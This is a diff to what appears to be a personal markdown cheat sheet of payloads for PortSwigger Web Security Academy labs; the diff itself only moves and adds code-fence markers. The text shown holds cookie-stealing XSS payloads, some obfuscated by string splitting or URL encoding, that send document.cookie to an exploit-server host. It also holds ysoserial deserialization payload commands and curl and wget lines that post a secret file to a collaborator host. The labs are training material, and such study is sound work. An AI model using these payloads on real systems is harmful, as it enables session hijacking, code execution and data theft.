@@ -9,9 +9,9 @@
 # Payload processing
 - [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
 # XSS
+```html
 "-(window["document"]["location"]="https://exploit-server%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
 "}; window['docu'+'ment']['loc'+'ation']='https://subdomain%2eexploit-server%2enet/?'+(window['docu'+'ment']['coo'+'kie']);//
-```html
 <script>
 location ='https://url.web-security-academy.net/?SearchTerm=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-0ab600a70433f087809c020301d4004f%252eexploit-server%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';
 </script>
@@ -36,5 +36,7 @@ java -jar ysoserial-all.jar [payload] "command"
 java -jar ysoserial-all.jar [payload] "command" | gzip -c | base64 -w 0
 ```
 # Command for data exfiltration
+```bash
 curl --data @/home/carlos/secret subdomain.collaborator.net
 wget --post-file /home/carlos/secret subdomain.collaborator.net
+```
